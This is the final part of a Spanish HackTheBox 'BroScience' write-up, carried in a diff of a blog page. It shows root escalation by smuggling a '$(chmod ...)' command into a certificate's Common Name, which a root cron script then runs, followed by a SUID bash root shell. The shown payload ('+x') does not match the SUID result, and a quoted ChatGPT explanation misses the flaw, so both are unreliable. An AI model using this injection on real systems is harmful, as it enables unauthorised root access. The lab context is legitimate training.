+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre></td><td class="rouge-code"><pre>bill@broscience:~<span class="nv">$ </span><span class="nb">cat</span> /opt/renew_cert.sh
+<span class="c">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 1 <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"-h"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"--help"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"help"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> certificate.crt"</span><span class="p">;</span>
+    <span class="nb">exit </span>0<span class="p">;</span>
+<span class="k">fi
+
+if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+
+    </span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-checkend</span> 86400 <span class="o">&gt;</span> /dev/null
+
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"No need to renew yet."</span><span class="p">;</span>
+        <span class="nb">exit </span>1<span class="p">;</span>
+    <span class="k">fi
+
+    </span><span class="nv">subject</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-subject</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"="</span> <span class="nt">-f2-</span><span class="si">)</span>
+
+    <span class="nv">country</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'C = .{2}'</span><span class="si">)</span>
+    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'ST = .*,'</span><span class="si">)</span>
+    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'L = .*,'</span><span class="si">)</span>
+    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'O = .*,'</span><span class="si">)</span>
+    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'OU = .*,'</span><span class="si">)</span>
+    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'CN = .*,?'</span><span class="si">)</span>
+    <span class="nv">emailAddress</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-email</span><span class="si">)</span>
+
+    <span class="nv">country</span><span class="o">=</span><span class="k">${</span><span class="nv">country</span>:4<span class="k">}</span>
+    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">state</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
+    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">locality</span>:3<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
+    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organization</span>:4<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
+    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organizationUnit</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
+    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">commonName</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
+
+    <span class="nb">echo</span> <span class="nv">$subject</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Country     =&gt; </span><span class="nv">$country</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"State       =&gt; </span><span class="nv">$state</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Locality    =&gt; </span><span class="nv">$locality</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Org Name    =&gt; </span><span class="nv">$organization</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Org Unit    =&gt; </span><span class="nv">$organizationUnit</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Common Name =&gt; </span><span class="nv">$commonName</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="s2">"Email       =&gt; </span><span class="nv">$emailAddress</span><span class="s2">"</span><span class="p">;</span>
+
+    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Generating certificate..."</span><span class="p">;</span>
+    openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> /tmp/temp.key <span class="nt">-out</span> /tmp/temp.crt <span class="nt">-days</span> 365 <span class="o">&lt;&lt;&lt;</span><span class="s2">"</span><span class="nv">$country</span><span class="s2">
+    </span><span class="nv">$state</span><span class="s2">
+    </span><span class="nv">$locality</span><span class="s2">
+    </span><span class="nv">$organization</span><span class="s2">
+    </span><span class="nv">$organizationUnit</span><span class="s2">
+    </span><span class="nv">$commonName</span><span class="s2">
+    </span><span class="nv">$emailAddress</span><span class="s2">
+    "</span> 2&gt;/dev/null
+
+    /bin/bash <span class="nt">-c</span> <span class="s2">"mv /tmp/temp.crt /home/bill/Certs/</span><span class="nv">$commonName</span><span class="s2">.crt"</span>
+<span class="k">else
+    </span><span class="nb">echo</span> <span class="s2">"File doesn't exist"</span>
+    <span class="nb">exit </span>1<span class="p">;</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>¿Qué hace este scrript?</p>
+
+<blockquote>
+  <p>ChatGPT: Este script es un archivo de shell (bash) que automatiza la renovación de un certificado de seguridad SSL/TLS en un servidor web mediante el uso de OpenSSL. A continuación, se explican las partes del código:
+La primera sección del código verifica si el script se ejecuta con un solo argumento que es el archivo de certificado que se va a renovar. Si el usuario proporciona más de un argumento o proporciona una opción de ayuda, se muestra un mensaje de uso y se sale del script.
+La segunda sección del código comprueba si el archivo de certificado especificado existe. Si existe, se utiliza OpenSSL para verificar la fecha de vencimiento del certificado. Si el certificado no ha caducado todavía, se muestra un mensaje y se sale del script. De lo contrario, se extraen los detalles del sujeto del certificado y se muestran en la salida.
+La tercera sección del código genera un nuevo certificado autofirmado con la misma información del sujeto que se extrajo del certificado anterior. El nuevo certificado se guarda en un directorio específico y se nombra después del nombre común del sujeto. El certificado anterior se reemplaza por el nuevo certificado recién generado.
+En resumen, el script automatiza la renovación de un certificado SSL/TLS para un servidor web. Si el certificado existente está a punto de caducar, el script genera un nuevo certificado autofirmado y lo reemplaza en el servidor.</p>
+</blockquote>
+
+<p>Generamos un certificado SSL con el mismo nombre y le injectamos codigo malicioso.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> /home/bill/Certs/broscience.key <span class="nt">-out</span> /home/bill/ Certificados/broscience.crt <span class="nt">-d</span>ías 1
+</pre></td></tr></tbody></table></code></div></div>
+<p>Nos debería quedar así.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre>bill@broscience:~<span class="nv">$ </span>openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> /home/bill/Certs/broscience.key <span class="nt">-out</span> /home/bill/Certs/broscience.crt <span class="nt">-days</span> 1
+Generating a RSA private key
+....................................................................................++++
+.............................++++
+writing new private key to <span class="s1">'/home/bill/Certs/broscience.key'</span>
+<span class="nt">-----</span>
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter <span class="s1">'.'</span>, the field will be left blank.
+<span class="nt">-----</span>
+Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:
+State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:
+Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:
+Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:
+Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:
+Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:<span class="si">$(</span><span class="nb">chmod</span> +x /bin/bash<span class="si">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>En unos minutos nuestra bash sera SUID.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>bill@broscience:~/Certs<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1234376 Mar 27  2022 /bin/bash
+</pre></td></tr></tbody></table></code></div></div>
+<p>Hacemos lo siguiente:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>bill@broscience:~/Certs<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.1# <span class="nb">whoami
+</span>root
+bash-5.1# 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Procedemos a leer la flag</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>bash-5.1# <span class="nb">cat</span> /root/root.txt
+da<span class="k">****************************</span>8e
+bash-5.1# 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><img data-src="/assets/img/commons/broScience-writeup/hacker.gif" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>Rooted</em></p>
+
+<p>Esa fue la máquina de hoy, ¡Feliz Hackeo!</p>
+
 
 </div>
 
@@ -791,6 +3503,35 @@
   
 
   <!-- tags -->
+  
+  <div class="post-tags">
+    <i class="fa fa-tags fa-fw mr-1"></i>
+      
+      <a href="/tags/medium/"
+          class="post-tag no-text-decoration" >medium</a>
+      
+      <a href="/tags/linux/"
+          class="post-tag no-text-decoration" >linux</a>
+      
+      <a href="/tags/writeup/"
+          class="post-tag no-text-decoration" >writeup</a>
+      
+      <a href="/tags/hackthebox/"
+          class="post-tag no-text-decoration" >hackthebox</a>
+      
+      <a href="/tags/directory-transversal/"
+          class="post-tag no-text-decoration" >directory transversal</a>
+      
+      <a href="/tags/ssl-certificate/"
+          class="post-tag no-text-decoration" >SSL certificate</a>
+      
+      <a href="/tags/cookie/"
+          class="post-tag no-text-decoration" >cookie</a>
+      
+      <a href="/tags/postgresql/"
+          class="post-tag no-text-decoration" >Postgresql</a>
+      
+  </div>
   
 
   <div class="post-tail-bottom
@@ -890,6 +3631,16 @@
         
         
         
+      <li><a href="/posts/metatwo-writeup/">MetaTwo WriteUp</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
+      
+        
+        
+        
       <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
       
         
@@ -901,16 +3652,6 @@
         
         
       <li><a href="/posts/precious-writeup/">Precious WriteUp</a></li>
-      
-        
-        
-        
-      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
-      
-        
-        
-        
-      <li><a href="/posts/inject-writeup/">Inject WriteUp</a></li>
       
     </ul>
   </div> <!-- #access-lastmod -->
@@ -963,200 +3704,6 @@
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -1200,6 +3747,101 @@
     
     
     
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -1285,10 +3927,6 @@
     
     
     
-      
-        
-        
-
   
     
     
@@ -1318,6 +3956,227 @@
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1328,13 +4187,6 @@
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
@@ -1344,23 +4196,6 @@
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
     
   
     
@@ -1379,9 +4214,6 @@
 
     
       
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
       <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
     
       
@@ -1389,6 +4221,9 @@
     
       
       <a class="post-tag" href="/tags/writeup/">writeup</a>
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
     
       
       <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
@@ -1400,13 +4235,13 @@
       <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
     
       
+      <a class="post-tag" href="/tags/medium/">medium</a>
+    
+      
       <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
     
       
       <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
-    
-      
-      <a class="post-tag" href="/tags/docker/">docker</a>
     
 
     </div>
@@ -1420,6 +4255,14 @@
       
 
 
+
+<!-- BS-toc.js will be loaded at medium priority -->
+<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
+  <nav id="toc" data-toggle="toc"></nav>
+</div>
 
 
     
@@ -1607,43 +4450,6 @@
       
       
       <div class="card">
-        <a href="/posts/shoppy-writeup/">
-          <div class="card-body">
-            <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-
-<em class="small"
-    data-ts="1673625600"
-    data-df="YYYY-MM-DD"
-    >
-  2023-01-13
-</em>
-
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
-            <div class="text-muted small">
-              <p>
-                
-
-
-
-
-
-                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
-              </p>
-            </div>
-          </div>
-        </a>
-      </div>
-    
-      
-      
-      <div class="card">
         <a href="/posts/ambassador-writeup/">
           <div class="card-body">
             <!--
@@ -1682,7 +4488,7 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
       
       
       <div class="card">
-        <a href="/posts/precious-writeup/">
+        <a href="/posts/inject-writeup/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1694,13 +4500,13 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
 
 
 <em class="small"
-    data-ts="1673884800"
+    data-ts="1678550400"
     data-df="YYYY-MM-DD"
     >
-  2023-01-16
+  2023-03-11
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Precious WriteUp</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Inject WriteUp</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1709,7 +4515,44 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
 
 
 
-                Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la es...
+                Les explicaré cómo compremeter la máquina Inject de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal, usando dicha vulnerabilidad veremos ...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/shoppy-writeup/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class="small"
+    data-ts="1673625600"
+    data-df="YYYY-MM-DD"
+    >
+  2023-01-13
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
               </p>
             </div>
           </div>
@@ -1843,200 +4686,6 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
     
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
   
     
     
@@ -2080,6 +4729,101 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
     
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
     
   
     
@@ -2165,10 +4909,6 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
     
-      
-        
-        
-
   
     
     
@@ -2198,6 +4938,227 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -2208,13 +5169,6 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
       
-    
-  
-    
-    
-    
-    
-      
         
         
 
@@ -2224,23 +5178,6 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
     
       
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
     
   
     
@@ -2259,9 +5196,6 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
 
     
       
-      <a class="post-tag" href="/tags/easy/">easy</a>
-    
-      
       <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
     
       
@@ -2269,6 +5203,9 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
     
       
       <a class="post-tag" href="/tags/writeup/">writeup</a>
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
     
       
       <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
@@ -2280,13 +5217,13 @@ a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
       <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
     
       
+      <a class="post-tag" href="/tags/medium/">medium</a>
+    
+      
       <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
     
       
       <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
-    
-      
-      <a class="post-tag" href="/tags/docker/">docker</a>
     
 
     </div>
